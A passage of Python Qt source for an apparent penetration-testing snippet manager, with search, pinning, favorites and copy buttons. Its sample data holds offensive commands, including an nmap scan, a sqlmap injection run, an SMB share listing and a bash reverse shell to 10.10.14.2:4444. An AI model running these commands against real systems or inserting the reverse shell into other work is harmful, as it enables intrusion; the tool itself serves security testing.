        sv.addSpacing(8);sv.addWidget(self._label("Quick Tags","SnippetSection"),0)
        tag_row=QFrame(self.side);tag_row.setObjectName("SnippetChipWrap")
        tv=QVBoxLayout(tag_row);tv.setContentsMargins(0,0,0,0);tv.setSpacing(6)
        for tag in ("web","recon","linux","windows","sqli","shell"):
            c=self._btn(tag,check=True);c.clicked.connect(lambda chk=False,t=tag:self._tag_search(t));tv.addWidget(c,0)
        sv.addWidget(tag_row,0);sv.addStretch(1)
        self.results_frame=QFrame(self.split);self.results_frame.setObjectName("SnippetResultsFrame")
        rv=QVBoxLayout(self.results_frame);rv.setContentsMargins(10,10,10,10);rv.setSpacing(8)
        rh=QHBoxLayout();rh.setContentsMargins(0,0,0,0);rh.setSpacing(8)
        self.lbl_count=self._label("0 snippets","SnippetTitle")
        self.btn_sort=QComboBox(self.results_frame);self.btn_sort.setObjectName("HomePerPage");self.btn_sort.addItems(["Best Match","Recently Used","Most Copied","Title"])
        rh.addWidget(self.lbl_count,1);rh.addWidget(self.btn_sort,0)
        self.results=QListWidget(self.results_frame);self.results.setObjectName("SnippetResults");self.results.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection);self.results.itemClicked.connect(self._on_item)
        rv.addLayout(rh,0);rv.addWidget(self.results,1)
        self.viewer=QFrame(self.split);self.viewer.setObjectName("SnippetViewer")
        vv=QVBoxLayout(self.viewer);vv.setContentsMargins(12,12,12,12);vv.setSpacing(10)
        self.lbl_title=self._label("Select a snippet","SnippetViewerTitle");self.lbl_meta=self._label("","SnippetMeta")
        mode=QHBoxLayout();mode.setSpacing(8)
        self.btn_preview=self._btn("Preview",check=True);self.btn_raw=self._btn("Raw",check=True);self.btn_resolved=self._btn("Resolved",check=True);self.btn_preview.setChecked(True)
        for b in (self.btn_preview,self.btn_raw,self.btn_resolved):mode.addWidget(b,0)
        mode.addStretch(1)
        self.command=QPlainTextEdit(self.viewer);self.command.setObjectName("SnippetCommand");self.command.setReadOnly(True)
        self.placeholders=QFrame(self.viewer);self.placeholders.setObjectName("SnippetPlaceholders")
        self.ph=QVBoxLayout(self.placeholders);self.ph.setContentsMargins(10,10,10,10);self.ph.setSpacing(6)
        actions=QHBoxLayout();actions.setSpacing(8)
        self.btn_copy=self._btn("Copy");self.btn_copy_raw=self._btn("Copy Raw");self.btn_copy_resolved=self._btn("Copy Resolved");self.btn_pin=self._btn("Pin");self.btn_edit=self._btn("Edit");self.btn_note=self._btn("Open Note")
        for b in (self.btn_copy,self.btn_copy_raw,self.btn_copy_resolved,self.btn_pin,self.btn_edit,self.btn_note):actions.addWidget(b,0)
        actions.addStretch(1)
        self.lbl_status=self._label("UI preview mode. Logic integration comes next.","SnippetStatus")
        vv.addWidget(self.lbl_title,0);vv.addWidget(self.lbl_meta,0);vv.addLayout(mode,0);vv.addWidget(self.command,1);vv.addWidget(self.placeholders,0);vv.addLayout(actions,0);vv.addWidget(self.lbl_status,0)
        self.split.addWidget(self.side);self.split.addWidget(self.results_frame);self.split.addWidget(self.viewer)
        self.split.setStretchFactor(0,0);self.split.setStretchFactor(1,1);self.split.setStretchFactor(2,1)
        try:self.split.setSizes([220,430,520])
        except Exception:pass
        self.search.textChanged.connect(self._apply);self.cmb_scope.currentTextChanged.connect(self._apply);self.cmb_state.currentTextChanged.connect(self._apply);self.btn_sort.currentTextChanged.connect(self._apply)
        self.btn_view_list.clicked.connect(lambda:self._set_view("list"));self.btn_view_table.clicked.connect(lambda:self._set_view("table"))
        self.btn_preview.clicked.connect(lambda:self._set_mode("preview"));self.btn_raw.clicked.connect(lambda:self._set_mode("raw"));self.btn_resolved.clicked.connect(lambda:self._set_mode("resolved"))
        self.btn_copy.clicked.connect(lambda:self._copy("preview"));self.btn_copy_raw.clicked.connect(lambda:self._copy("raw"));self.btn_copy_resolved.clicked.connect(lambda:self._copy("resolved"));self.btn_pin.clicked.connect(self._pin_current)
        self._set_collection("All")
        _log("[+]",f"SearchCore preview UI ready")
    def _seed_items(self):
        return [
            {"id":"nmap_fast","title":"Nmap Fast Scan","src":"Linked","note":"Recon Basics","cat":"recon","sub":"ports","tags":["nmap","recon","tcp"],"cmd":"nmap -sV -sC -T4 {TARGET_IP}","resolved":"nmap -sV -sC -T4 10.10.10.5","desc":"Fast service discovery against the live target.","pin":True,"count":42,"recent":1,"missing":[]},
            {"id":"web_headers","title":"Curl Headers","src":"Standalone","note":"","cat":"web","sub":"headers","tags":["web","curl","headers"],"cmd":"curl -I {URL}","resolved":"curl -I https://target.local","desc":"Quick response headers check.","pin":False,"count":18,"recent":2,"missing":[]},
            {"id":"sqlmap_basic","title":"SQLMap Basic","src":"Linked","note":"SQL Injection","cat":"web","sub":"sqli","tags":["web","sqli","sqlmap"],"cmd":"sqlmap -u \"{URL}\" --batch --risk=2 --level=3","resolved":"sqlmap -u \"https://target.local/item?id=1\" --batch --risk=2 --level=3","desc":"Baseline SQL injection test with safe defaults.","pin":True,"count":27,"recent":3,"missing":[]},
            {"id":"lin_find_suid","title":"Linux SUID Find","src":"Standalone","note":"","cat":"linux","sub":"privilege","tags":["linux","privesc","find"],"cmd":"find / -perm -4000 -type f 2>/dev/null","resolved":"find / -perm -4000 -type f 2>/dev/null","desc":"Find SUID binaries on Linux.","pin":False,"count":31,"recent":6,"missing":[]},
            {"id":"win_shares","title":"Windows SMB Shares","src":"Linked","note":"Windows Enumeration","cat":"windows","sub":"smb","tags":["windows","smb","netexec"],"cmd":"netexec smb {TARGET_IP} -u {USER} -p {PASS} --shares","resolved":"netexec smb 10.10.10.5 -u {USER} -p {PASS} --shares","desc":"List SMB shares using supplied credentials.","pin":False,"count":12,"recent":4,"missing":["USER","PASS"]},
            {"id":"reverse_shell","title":"Bash Reverse Shell","src":"Standalone","note":"","cat":"shell","sub":"linux","tags":["shell","linux","bash"],"cmd":"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'","resolved":"bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'","desc":"Compact bash reverse shell payload.","pin":False,"count":55,"recent":5,"missing":[]}
        ]
    def _btn(self,text,check=False):
        b=QToolButton(self.frame);b.setObjectName("SnippetBtn");b.setCursor(Qt.CursorShape.PointingHandCursor);b.setText(text);b.setCheckable(bool(check));return b
    def _label(self,text,obj):
        l=QLabel(text,self.frame);l.setObjectName(obj);l.setWordWrap(True);return l
    def _tag_search(self,tag):
        self.search.setText(tag);self.cmb_scope.setCurrentText("Tags")
    def _set_collection(self,name):
        self._collection=name
        for b in self.collection_buttons:b.setChecked(b.text()==name)
        self._apply()
    def _set_view(self,name):
        self.btn_view_list.setChecked(name=="list");self.btn_view_table.setChecked(name=="table")
        self.lbl_status.setText("Table view is a planned alternate layout in this UI preview." if name=="table" else "List view selected.")
    def _set_mode(self,name):
        for b,n in ((self.btn_preview,"preview"),(self.btn_raw,"raw"),(self.btn_resolved,"resolved")):b.setChecked(n==name)
        self._show(self._current())
    def _current_mode(self):
        if self.btn_raw.isChecked():return "raw"
        if self.btn_resolved.isChecked():return "resolved"
        return "preview"
    def _current(self):
        for n in self._items:
            if n.get("id")==self._selected_id:return n
        return self._view[0] if self._view else None
    def _matches(self,n):
        q=_l(self.search.text());scope=self.cmb_scope.currentText();state=self.cmb_state.currentText()
        if self._collection=="Pinned" and not n.get("pin"):return False
        if self._collection=="Linked" and n.get("src")!="Linked":return False
        if self._collection=="Standalone" and n.get("src")!="Standalone":return False
        if self._collection=="Missing Values" and not n.get("missing"):return False
        if state=="Linked" and n.get("src")!="Linked":return False
        if state=="Standalone" and n.get("src")!="Standalone":return False
        if state=="Has Placeholder" and "{" not in n.get("cmd",""):return False
        if state=="Missing Value" and not n.get("missing"):return False
        if not q:return True
        data={"Title":n.get("title",""),"Command":n.get("cmd",""),"Tags":" ".join(n.get("tags",[])),"Category":n.get("cat","")+" "+n.get("sub","")}
        blob=data.get(scope," ".join([n.get("title",""),n.get("cmd","")," ".join(n.get("tags",[])),n.get("cat",""),n.get("sub",""),n.get("note",""),n.get("desc","")]))
        return q in _l(blob)
    def _apply(self,*_):
        rows=[n for n in self._items if self._matches(n)]
        sort=self.btn_sort.currentText()
        if self._collection=="Recent" or sort=="Recently Used":rows.sort(key=lambda n:n.get("recent",999))
        elif self._collection=="Most Used" or sort=="Most Copied":rows.sort(key=lambda n:-int(n.get("count",0)))
        elif sort=="Title":rows.sort(key=lambda n:_l(n.get("title","")))
        else:rows.sort(key=lambda n:(not n.get("pin"),n.get("recent",999),_l(n.get("title",""))))
        self._view=rows;self.results.clear()
        for n in rows:
            it=QListWidgetItem(self._row_text(n));it.setData(Qt.ItemDataRole.UserRole,n.get("id"));it.setSizeHint(QSize(260,72));self.results.addItem(it)
        self.lbl_count.setText(f"{len(rows)} snippets")
        if rows:
            idx=0
            if self._selected_id:
                for i,n in enumerate(rows):
                    if n.get("id")==self._selected_id:idx=i;break
            self.results.setCurrentRow(idx);self._selected_id=rows[idx].get("id");self._show(rows[idx])
        else:
            self._selected_id=None;self._show(None)
    def _row_text(self,n):
        pin="PIN " if n.get("pin") else ""
        miss="  Missing: "+",".join(n.get("missing",[])) if n.get("missing") else ""
        return f"{pin}{n.get('title','Untitled')}\n{n.get('cat','')} / {n.get('sub','')}   {', '.join(n.get('tags',[]))}{miss}\n{_ell(n.get('cmd',''),110)}"
    def _on_item(self,item):
        self._selected_id=item.data(Qt.ItemDataRole.UserRole);self._show(self._current())
    def _clear_layout(self,lay):
        while lay.count():
            it=lay.takeAt(0);w=it.widget()
            if w:w.setParent(None)
    def _show(self,n):
        self._clear_layout(self.ph)
        if not n:
            self.lbl_title.setText("No snippet selected");self.lbl_meta.setText("");self.command.clear();self.ph.addWidget(self._label("No placeholders","SnippetMeta"));return
        self.lbl_title.setText(n.get("title","Untitled"))
        self.lbl_meta.setText(f"{n.get('src','')} | {n.get('cat','')} / {n.get('sub','')} | copied {n.get('count',0)} times | note: {n.get('note','-') or '-'}")
        mode=self._current_mode();text=n.get("resolved" if mode=="resolved" else "cmd","");self.command.setPlainText(text)
        self.ph.addWidget(self._label("Placeholders","SnippetSection"),0)
        keys=[k for _,_,k in _iter_placeholders(n.get("cmd",""))]
        if not keys:self.ph.addWidget(self._label("No placeholders in this command.","SnippetMeta"),0)
        for k in keys:
            missing=k in (n.get("missing") or [])
            val="{missing}" if missing else ("10.10.10.5" if "IP" in k else ("https://target.local" if "URL" in k else "ready"))
            self.ph.addWidget(self._label(f"{k}: {val}","SnippetMissing" if missing else "SnippetMeta"),0)
        self.lbl_status.setText(n.get("desc",""))
    def _copy(self,mode):
        n=self._current()
        if not n:return
        text=n.get("resolved" if mode=="resolved" else "cmd","")
        QApplication.clipboard().setText(text);self.lbl_status.setText(f"Copied {mode}: {n.get('title','')}")
    def _pin_current(self):
        n=self._current()
        if not n:return
        n["pin"]=not bool(n.get("pin"));self.lbl_status.setText(("Pinned: " if n.get("pin") else "Unpinned: ")+n.get("title",""));self._apply()
class SimpleSnippetPreviewWidget(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent)
        self._items=self._seed_items();self._expanded=set();self._filter="All";self._last_copied=""
        root=QVBoxLayout(self);root.setContentsMargins(0,0,0,0);root.setSpacing(0)
        self.frame=QFrame(self);self.frame.setObjectName("SimpleSnippetPage");root.addWidget(self.frame,1)
        v=QVBoxLayout(self.frame);v.setContentsMargins(10,10,10,10);v.setSpacing(10)
        top=QHBoxLayout();top.setContentsMargins(4,0,4,0);top.setSpacing(10)
        self.search=QLineEdit(self.frame);self.search.setObjectName("HomeSearch");self.search.setPlaceholderText("Search snippets...")
        self.mode=QComboBox(self.frame);self.mode.setObjectName("HomePerPage");self.mode.addItems(["All","Title","Command","Tag","Category"])
        self.btn_all=self._top_btn("All");self.btn_pin=self._top_btn("Pinned");self.btn_recent=self._top_btn("Recent")
        for b,n in ((self.btn_all,"All"),(self.btn_pin,"Pinned"),(self.btn_recent,"Recent")):b.clicked.connect(lambda chk=False,x=n:self._set_filter(x))
        self.btn_all.setChecked(True)
        top.addWidget(self.search,1);top.addWidget(self.mode,0);top.addWidget(self.btn_all,0);top.addWidget(self.btn_pin,0);top.addWidget(self.btn_recent,0)
        self.status=QLabel("Click a card to expand. Double-click a card to copy resolved command.",self.frame);self.status.setObjectName("SimpleSnippetStatus")
        self.scroll=QScrollArea(self.frame);self.scroll.setObjectName("SimpleSnippetScroll");self.scroll.setWidgetResizable(True);self.scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        self.wrap=QFrame(self.scroll);self.wrap.setObjectName("SimpleSnippetWrap")
        self.list=QVBoxLayout(self.wrap);self.list.setContentsMargins(0,0,0,0);self.list.setSpacing(8)
        self.scroll.setWidget(self.wrap)
        v.addLayout(top,0);v.addWidget(self.status,0);v.addWidget(self.scroll,1)
        self.search.textChanged.connect(self._render);self.mode.currentTextChanged.connect(self._render)
        self._render()
        _log("[+]",f"Simple snippets preview UI ready")
    def _seed_items(self):
        return [
            {"id":"nmap_fast","title":"Nmap Fast Scan","cat":"recon","sub":"ports","tags":["nmap","tcp","target"],"cmd":"nmap -sV -sC -T4 {TARGET_IP}","resolved":"nmap -sV -sC -T4 10.10.10.5","desc":"Fast service discovery against the live target.","pin":True,"recent":1},
            {"id":"sqlmap_basic","title":"SQLMap Basic","cat":"web","sub":"sqli","tags":["sqlmap","sqli","url"],"cmd":"sqlmap -u \"{URL}\" --batch --risk=2 --level=3","resolved":"sqlmap -u \"https://target.local/item?id=1\" --batch --risk=2 --level=3","desc":"Baseline SQL injection test with common options.","pin":True,"recent":3},
            {"id":"curl_headers","title":"Curl Headers","cat":"web","sub":"headers","tags":["curl","headers"],"cmd":"curl -I {URL}","resolved":"curl -I https://target.local","desc":"Quick header check for a web target.","pin":False,"recent":2},
            {"id":"linux_suid","title":"Linux SUID Find","cat":"linux","sub":"privesc","tags":["linux","find","suid"],"cmd":"find / -perm -4000 -type f 2>/dev/null","resolved":"find / -perm -4000 -type f 2>/dev/null","desc":"Find SUID binaries on Linux.","pin":False,"recent":5},
            {"id":"smb_shares","title":"Windows SMB Shares","cat":"windows","sub":"smb","tags":["windows","smb","netexec"],"cmd":"netexec smb {TARGET_IP} -u {USER} -p {PASS} --shares","resolved":"netexec smb 10.10.10.5 -u {USER} -p {PASS} --shares","desc":"List SMB shares. USER and PASS stay unresolved in this preview.","pin":False,"recent":4},
            {"id":"bash_reverse","title":"Bash Reverse Shell","cat":"shell","sub":"linux","tags":["shell","bash","linux"],"cmd":"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'","resolved":"bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'","desc":"Compact bash reverse shell payload.","pin":False,"recent":6}
        ]
    def _top_btn(self,text):
        b=QToolButton(self.frame);b.setObjectName("SimpleSnippetTopBtn");b.setCursor(Qt.CursorShape.PointingHandCursor);b.setText(text);b.setCheckable(True);return b
    def _btn(self,text):
        b=QToolButton(self.frame);b.setObjectName("SimpleSnippetBtn");b.setCursor(Qt.CursorShape.PointingHandCursor);b.setText(text);return b
    def _lbl(self,text,obj):
        l=QLabel(text,self.frame);l.setObjectName(obj);l.setWordWrap(True);return l
    def _clear(self):
        while self.list.count():
            it=self.list.takeAt(0);w=it.widget()
            if w:w.setParent(None)
    def _set_filter(self,name):
        self._filter=name
        for b,n in ((self.btn_all,"All"),(self.btn_pin,"Pinned"),(self.btn_recent,"Recent")):b.setChecked(n==name)
        self._render()
    def _matches(self,n):
        if self._filter=="Pinned" and not n.get("pin"):return False
        q=_l(self.search.text())
        if not q:return True
        mode=self.mode.currentText()
        vals={"Title":n.get("title",""),"Command":n.get("cmd",""),"Tag":" ".join(n.get("tags",[])),"Category":n.get("cat","")+" "+n.get("sub","")}
        blob=vals.get(mode," ".join([n.get("title",""),n.get("cmd","")," ".join(n.get("tags",[])),n.get("cat",""),n.get("sub",""),n.get("desc","")]))
        return q in _l(blob)
    def _rows(self):
        rows=[n for n in self._items if self._matches(n)]
        if self._filter=="Recent":rows.sort(key=lambda n:n.get("recent",999))
        else:rows.sort(key=lambda n:(not n.get("pin"),n.get("recent",999),_l(n.get("title",""))))
        return rows
    def _render(self,*_):
        self._clear()
        rows=self._rows()
        for n in rows:self.list.addWidget(self._card(n),0)
        self.list.addStretch(1)
        self.status.setText(f"{len(rows)} snippets. Click a card to expand, double-click to copy resolved command." if not self._last_copied else self._last_copied)
    def _card(self,n):
        box=QFrame(self.wrap);box.setObjectName("SimpleSnippetCard");box.setCursor(Qt.CursorShape.PointingHandCursor)
        v=QVBoxLayout(box);v.setContentsMargins(12,10,12,10);v.setSpacing(7)
        top=QHBoxLayout();top.setSpacing(8)
        title=self._lbl(("PIN " if n.get("pin") else "")+n.get("title","Untitled"),"SimpleSnippetTitle")
        copy=self._btn("Copy");copy.clicked.connect(lambda chk=False,x=n:self._copy(x,"resolved"))
        top.addWidget(title,1);top.addWidget(copy,0)
        meta=self._lbl(f"{n.get('cat','')} / {n.get('sub','')}    {', '.join(n.get('tags',[]))}","SimpleSnippetMeta")
        cmd=self._lbl(n.get("cmd",""),"SimpleSnippetCommand")
        v.addLayout(top,0);v.addWidget(meta,0);v.addWidget(cmd,0)
        if n.get("id") in self._expanded:
            detail=self._lbl(n.get("desc",""),"SimpleSnippetDetail")
            ph=self._lbl("Placeholders: "+(", ".join([k for _,_,k in _iter_placeholders(n.get("cmd",""))]) or "none"),"SimpleSnippetMeta")
            act=QHBoxLayout();act.setSpacing(8)
            b1=self._btn("Copy");b2=self._btn("Copy Raw");b3=self._btn("Edit");b4=self._btn("Pin" if not n.get("pin") else "Unpin")
            b1.clicked.connect(lambda chk=False,x=n:self._copy(x,"resolved"));b2.clicked.connect(lambda chk=False,x=n:self._copy(x,"raw"));b3.clicked.connect(lambda chk=False,x=n:self._set_status(f"Edit preview: {x.get('title','')}"));b4.clicked.connect(lambda chk=False,x=n:self._pin(x))
            for b in (b1,b2,b3,b4):act.addWidget(b,0)
            act.addStretch(1)
            v.addWidget(detail,0);v.addWidget(ph,0);v.addLayout(act,0)
        box.mousePressEvent=lambda e,x=n:self._toggle(x)
        box.mouseDoubleClickEvent=lambda e,x=n:self._copy(x,"resolved")
        return box
    def _toggle(self,n):
        k=n.get("id")
        if k in self._expanded:self._expanded.remove(k)
        else:self._expanded.add(k)
        self._render()
    def _copy(self,n,mode):
        text=n.get("cmd" if mode=="raw" else "resolved","")
        QApplication.clipboard().setText(text)
        self._last_copied=f"Copied {mode}: {n.get('title','')}"
        self.status.setText(self._last_copied)
    def _set_status(self,text):
        self._last_copied=text;self.status.setText(text)
    def _pin(self,n):
        n["pin"]=not bool(n.get("pin"))
        self._last_copied=("Pinned: " if n.get("pin") else "Unpinned: ")+n.get("title","")
        self._render()
class Widget(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent)
        self._db_path=None;self._db_mtime=None;self._cmds=[];self._view=[];self._sort_mode="A -> Z"
        favs,only=self._load_favorites()
        self._favorites=set(favs);self._favorites_only=bool(only)
        self._fav_icon=None;self._fav_icon_on=None;self._load_icons()
        self.ctx=LiveTargetContext();self.rep=CommandReplacer(self.ctx)
        root=QVBoxLayout(self);root.setContentsMargins(0,0,0,0);root.setSpacing(0)
        self.frame=QFrame(self);self.frame.setObjectName("CommandsNotesFrame");root.addWidget(self.frame,1)
        v=QVBoxLayout(self.frame);v.setContentsMargins(10,10,10,10);v.setSpacing(10)
        top=QHBoxLayout();top.setContentsMargins(14,8,14,0);top.setSpacing(10)
        self.search=QLineEdit(self.frame);self.search.setObjectName("TargetSearch");self.search.setPlaceholderText("Search snippets...")
        self.search.setMinimumHeight(30);self.search.setMaximumHeight(30);self.search.textChanged.connect(self._on_search)
        self.btn_sort=QToolButton(self.frame);self.btn_sort.setObjectName("MiniFilterBtn");self.btn_sort.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_sort.setPopupMode(QToolButton.ToolButtonPopupMode.InstantPopup);self.btn_sort.setText("Sort By");self.btn_sort.setMinimumHeight(30);self.btn_sort.setMaximumHeight(30)
        sm=QMenu(self.btn_sort)
        for text,mode in (("Sort By A -> Z","A -> Z"),("Sort By Z -> A","Z -> A"),("Sort By Newest","Newest"),("Fav First","Fav First")):
            a=QAction(text,self);a.triggered.connect(lambda checked=False,m=mode:self._set_sort_mode(m));sm.addAction(a)
        self.btn_sort.setMenu(sm)
        self.btn_fav=QToolButton(self.frame);self.btn_fav.setObjectName("MiniFilterBtn");self.btn_fav.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_fav.setCheckable(True);self.btn_fav.setChecked(self._favorites_only);self.btn_fav.setText("Favorites");self.btn_fav.setMinimumHeight(30);self.btn_fav.setMaximumHeight(30);self.btn_fav.clicked.connect(self._on_favorites)
        fm=QFontMetrics(self.btn_fav.font());self.btn_fav.setFixedWidth(max(120,fm.horizontalAdvance("Favorites")+38))
        self.btn_sort.setFixedWidth(max(110,fm.horizontalAdvance("Sort By")+38))
        top.addWidget(self.search,1);top.addWidget(self.btn_sort,0);top.addWidget(self.btn_fav,0)
        self.tbl_wrap=QFrame(self.frame);self.tbl_wrap.setObjectName("TargetTableFrame")
        tw=QVBoxLayout(self.tbl_wrap);tw.setContentsMargins(10,10,10,10);tw.setSpacing(10)
        self.table=QTableWidget(self.tbl_wrap);self.table.setObjectName("MiniCmdTable")
        self.table.setColumnCount(4)
        self.table.setHorizontalHeaderLabels(["Fav","Category","Sub Category","Command"])
        self.table.verticalHeader().setVisible(False)
        self.table.horizontalHeader().setVisible(False)
        self.table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self.table.setSortingEnabled(False);self.table.setAlternatingRowColors(False);self.table.setShowGrid(True);self.table.setWordWrap(True);self.table.setTextElideMode(Qt.TextElideMode.ElideNone)
        self.table.cellClicked.connect(self._on_cell_click);self.table.cellDoubleClicked.connect(self._on_cell_double)
        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu);self.table.customContextMenuRequested.connect(self._ctx_menu)
        h=self.table.horizontalHeader();h.setSectionResizeMode(0,QHeaderView.ResizeMode.Fixed);h.setSectionResizeMode(1,QHeaderView.ResizeMode.Fixed);h.setSectionResizeMode(2,QHeaderView.ResizeMode.Fixed);h.setSectionResizeMode(3,QHeaderView.ResizeMode.Stretch)
        self.table.setColumnWidth(0,30);self.table.setColumnWidth(1,150);self.table.setColumnWidth(2,150)
        tw.addWidget(self.table,1)
        self.pager=QFrame(self.tbl_wrap);self.pager.setObjectName("CommandsPagerFrame");self.pager.setVisible(False)
        ph=QHBoxLayout(self.pager);ph.setContentsMargins(0,0,0,0);ph.setSpacing(10)
        self.pager_left=QWidget(self.pager);self.pager_left.setFixedWidth(150)
        left=QHBoxLayout(self.pager_left);left.setContentsMargins(0,0,0,0);left.setSpacing(0)
        self.lbl_total=QLabel("",self.pager_left);self.lbl_total.setObjectName("CommandsTotal");left.addWidget(self.lbl_total,0,Qt.AlignmentFlag.AlignLeft|Qt.AlignmentFlag.AlignVCenter)
        mid=QHBoxLayout();mid.setContentsMargins(0,0,0,0);mid.setSpacing(8)
        self.btn_prev=QToolButton(self.pager);self.btn_prev.setObjectName("CommandsPagePrev");self.btn_prev.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_prev.setText("<")
        self.btn_next=QToolButton(self.pager);self.btn_next.setObjectName("CommandsPageNext");self.btn_next.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_next.setText(">")
        self.lbl_page=QLabel("0 of 0",self.pager);self.lbl_page.setObjectName("CommandsPageLabel");self.lbl_page.setAlignment(Qt.AlignmentFlag.AlignCenter);self.lbl_page.setMinimumWidth(72)
        self.btn_prev.clicked.connect(self._prev_page);self.btn_next.clicked.connect(self._next_page)
        mid.addWidget(self.btn_prev,0,Qt.AlignmentFlag.AlignCenter);mid.addWidget(self.lbl_page,0,Qt.AlignmentFlag.AlignCenter);mid.addWidget(self.btn_next,0,Qt.AlignmentFlag.AlignCenter)
        self.pager_right=QWidget(self.pager);self.pager_right.setFixedWidth(150)
        right=QHBoxLayout(self.pager_right);right.setContentsMargins(0,0,0,0);right.setSpacing(8)
        self.cmb_per=QComboBox(self.pager_right);self.cmb_per.setObjectName("CommandsPerPage");self.cmb_per.setMinimumWidth(66);self.cmb_per.setMaximumWidth(66);self.cmb_per.addItems(["10","20","50","100"]);self.cmb_per.setCurrentText("10");self.cmb_per.currentTextChanged.connect(self._on_per_page)
        self.lbl_per=QLabel("per page",self.pager_right);self.lbl_per.setObjectName("CommandsPerPageLbl")
        right.addWidget(self.cmb_per,0);right.addWidget(self.lbl_per,0)
        ph.addWidget(self.pager_left,0);ph.addStretch(1);ph.addLayout(mid,0);ph.addStretch(1);ph.addWidget(self.pager_right,0)
        tw.addWidget(self.pager,0)
        v.addLayout(top);v.addWidget(self.tbl_wrap,1)
        QTimer.singleShot(0,self.reload)
        self.t=QTimer(self);self.t.setInterval(900);self.t.timeout.connect(self._tick);self.t.start()
        _log("[+]",f"Snippets table ready")
    def _settings_path(self):
        d=_abs("..","Data");os.makedirs(d,exist_ok=True);return os.path.join(d,"settings.json")
    def _load_icons(self):
        on=_abs("..","Assets","Fav_selected.png");off=_abs("..","Assets","Fav.png")
        if os.path.isfile(on):self._fav_icon_on=QIcon(on)
        if os.path.isfile(off):self._fav_icon=QIcon(off)
    def _fav_key(self,n):
        if not isinstance(n,dict):return ""
        src=n.get("src") or ""
        cid=n.get("id")
        if cid is not None:return f"{src}:{cid}"
        cmd=n.get("command") or ""
        if cmd:return cmd.strip().lower()
        title=n.get("title") or ""
        return title.strip().lower()
    def _load_favorites(self):
        d=_read_json(self._settings_path(),{})
        m=d.get("mini_window",{}) if isinstance(d,dict) else {}
        favs=m.get("favorites",[]) if isinstance(m,dict) else []
        if not isinstance(favs,list):favs=[]
        return [str(x) for x in favs if str(x).strip()],bool(m.get("favorites_only",False)) if isinstance(m,dict) else False
    def _save_favorites(self):
        d=_read_json(self._settings_path(),{})
        if not isinstance(d,dict):d={}
        m=d.get("mini_window",{}) if isinstance(d.get("mini_window",{}),dict) else {}
        m["favorites"]=sorted(list(self._favorites));d["mini_window"]=m;_write_json(self._settings_path(),d)
    def _save_favorites_only(self):
        d=_read_json(self._settings_path(),{})
        if not isinstance(d,dict):d={}
        m=d.get("mini_window",{}) if isinstance(d.get("mini_window",{}),dict) else {}
        m["favorites_only"]=bool(self._favorites_only);d["mini_window"]=m;_write_json(self._settings_path(),d)
    def _compact_cmd(self,cmd):
        raw=_norm(cmd)
        if not raw:return ""
        lines=[ln.strip() for ln in raw.splitlines()]
        text=" ".join([ln for ln in lines if ln])
        return re.sub(r"\s+"," ",text).strip()
    def _cmd_preview(self,n):
        return self.rep.apply(n.get("command","")) if n else ""
    def _sort_key(self,n):
        return (_l(n.get("title","")),_l(n.get("category","")),_l(n.get("sub","")),_l(n.get("command","")))
    def _sort_rows(self,rows):
        mode=getattr(self,"_sort_mode","A -> Z")
        rows=list(rows or [])
        if mode=="Z -> A":return sorted(rows,key=self._sort_key,reverse=True)
        if mode=="Newest":return sorted(rows,key=lambda n:int(n.get("id",0) or 0),reverse=True)
        if mode=="Fav First":return sorted(rows,key=lambda n:(0 if self._fav_key(n) in self._favorites else 1,self._sort_key(n)))
        return sorted(rows,key=self._sort_key)
    def reload(self):
        self._db_path,self._cmds=_load_cmds(self._db_path)
        self._db_mtime=_safe_mtime(self._db_path)
        self._apply()
    def refresh(self):
        self.reload()
    def _tick(self):
        p=_db_path();mt=_safe_mtime(p)
        if p!=self._db_path or mt!=self._db_mtime:
            self.reload();return
        if self.ctx.changed():
            self.ctx.reload();self._render()
    def _apply(self):
        q=_l(self.search.text())
        base=[]
        for n in self._cmds:
            if q:
                blob=" ".join([n.get("title",""),n.get("note_name",""),n.get("group_name",""),n.get("category",""),n.get("sub",""),n.get("tags",""),n.get("command",""),n.get("description","")])
                if q not in _l(blob):continue
            base.append(n)
        if self._favorites_only:base=[n for n in base if self._fav_key(n) in self._favorites]
        self._view=self._sort_rows(base)
        self._render()
    def _render(self):
        rows=self._view;self.lbl_total.setText(f"Total: {len(rows)}")
        self.table.setRowCount(len(rows))
        for r,n in enumerate(rows):self._set_row(r,n)
        self.table.clearSelection()
    def _set_item(self,row,col,text,full=None,align=None,bold=False):
        it=QTableWidgetItem(text)
        it.setFlags(Qt.ItemFlag.ItemIsEnabled|Qt.ItemFlag.ItemIsSelectable)
        if align is not None:it.setTextAlignment(align)
        if bold:
            f=it.font();f.setBold(True);f.setWeight(800);it.setFont(f)
        if full is not None:it.setData(Qt.ItemDataRole.UserRole,full)
        self.table.setItem(row,col,it)
    def _set_row(self,r,n):
        key=self._fav_key(n);is_fav=key in self._favorites
        fav=QTableWidgetItem("")
        icon=self._fav_icon_on if is_fav else self._fav_icon
        if icon:fav.setIcon(icon)
        fav.setTextAlignment(Qt.AlignmentFlag.AlignCenter);fav.setToolTip("Toggle favorite")
        cat=_norm(n.get("category",""));sub=_norm(n.get("sub",""));tags=_norm(n.get("tags",""))
        meta=[]
        if tags:meta.append(f"tags: {tags}")
        if _norm(n.get("note_name","")):meta.append(f"note: {_norm(n.get('note_name',''))}")
        cat_item=QTableWidgetItem(cat or "Uncategorized");cat_item.setData(Qt.ItemDataRole.UserRole,n);cat_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter);cat_item.setToolTip(" | ".join(meta) if meta else (cat or "Uncategorized"))
        sub_item=QTableWidgetItem(sub or "General");sub_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter);sub_item.setToolTip(sub or "General")
